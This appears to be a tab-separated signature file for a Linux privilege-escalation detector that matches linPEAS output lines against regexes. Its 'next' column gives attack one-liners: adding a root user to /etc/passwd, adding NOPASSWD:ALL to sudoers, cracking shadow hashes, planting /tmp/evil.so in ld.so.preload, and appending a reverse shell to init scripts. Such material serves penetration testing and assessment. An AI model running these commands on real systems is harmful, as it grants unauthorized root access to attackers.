# Linux privilege-escalation signatures for the linprivesc detector (the linPEAS counterpart to
# windows_signatures.tsv). These cover the HackTricks Linux checklist items that the structured
# detectors do NOT already handle - sudo -l, SUID, capabilities, cron, kernel CVEs and
# passwd/shadow parsing are each their own detector, so this file deliberately avoids them and
# focuses on writable-sensitive-files, NFS, containers, keys, creds, and the CVE tags linPEAS
# itself prints.
#
# pattern is a case-insensitive Java regex matched against each (colour-stripped) line. Add rows.
#
# id                pattern    severity  category  title  meaning  next
id	pattern	severity	category	title	meaning	next
writable_passwd	/etc/passwd\b.{0,25}(writable|is writable|you can write)|writable.{0,15}/etc/passwd	CRITICAL	Files	Writable /etc/passwd	You can edit the account database directly - add a second root user, or blank root's password field.	echo 'pwn:$(openssl passwd -1 pass):0:0::/root:/bin/bash' >> /etc/passwd ; su pwn   (checklist: writable sensitive files)
writable_shadow	/etc/shadow\b.{0,25}(writable|is writable|you can write)|writable.{0,15}/etc/shadow	CRITICAL	Files	Writable /etc/shadow	You can set any password hash - put a known one on root's line.	openssl passwd -6 pass ; edit root's hash in /etc/shadow ; su   (checklist: writable sensitive files)
readable_shadow	/etc/shadow\b.{0,25}(readable|is readable)|readable.{0,15}/etc/shadow	CRITICAL	Files	Readable /etc/shadow	Every password hash is exposed to offline cracking.	unshadow /etc/passwd /etc/shadow > h ; hashcat -m 1800 h wordlist   (checklist: readable shadow)
writable_sudoers	/etc/sudoers(\.d)?\b.{0,25}(writable|you can write)|writable.{0,15}/etc/sudoers	CRITICAL	Files	Writable sudoers	You can grant yourself passwordless root.	echo 'ALL ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/x ; sudo -i   (checklist: writable sudoers)
writable_systemd	(\.service|\.timer)\b.{0,30}(writable|you can write)|writable.{0,25}(systemd|\.service|\.timer)	CRITICAL	Services	Writable systemd unit or timer	A unit that runs as root and that you can edit - point ExecStart at your payload.	set ExecStart=/tmp/x ; systemctl daemon-reload ; systemctl start <unit>   (checklist: writable service files)
writable_initscript	(/etc/init\.d/|/etc/rc\.local|/etc/rc\d).{0,25}(writable|you can write)	WARN	Services	Writable init script	Runs as root at boot (or on service start); your code goes with it.	append a reverse shell / SUID drop to the script   (checklist: startup / init)
ldso_preload	/etc/ld\.so\.preload	CRITICAL	Files	ld.so.preload present	If this file is writable, a library you name in it is loaded into EVERY process, root included. Confirm write access.	echo /tmp/evil.so > /etc/ld.so.preload   (checklist: ld.so.preload / library hijack)
ldso_conf	/etc/ld\.so\.conf(\.d)?\b.{0,20}(writable|you can write)	CRITICAL	Files	Writable ld.so.conf(.d)	Add a directory holding a malicious library that a SUID/root binary will load.	add a path ; ldconfig ; hijack a needed lib   (checklist: library hijack)
writable_path	writable.{0,15}(folder|dir|director).{0,12}(in )?\$?PATH|\$?PATH.{0,20}(is )?writable	WARN	Path	Writable directory in PATH	A PATH directory you can write to lets you shadow a command a root process runs by name.	drop a binary named like the command an unquoted/relative call uses   (checklist: writable PATH)
writable_cron	(/etc/cron|/etc/crontab|cron\.d|cron\.daily|cron\.hourly).{0,25}(writable|you can write)	WARN	Cron	Writable cron path or script	A cron job's script or directory that you can edit - it runs on schedule as its owner (often root).	replace the script body ; wait for the next tick   (checklist: cron)
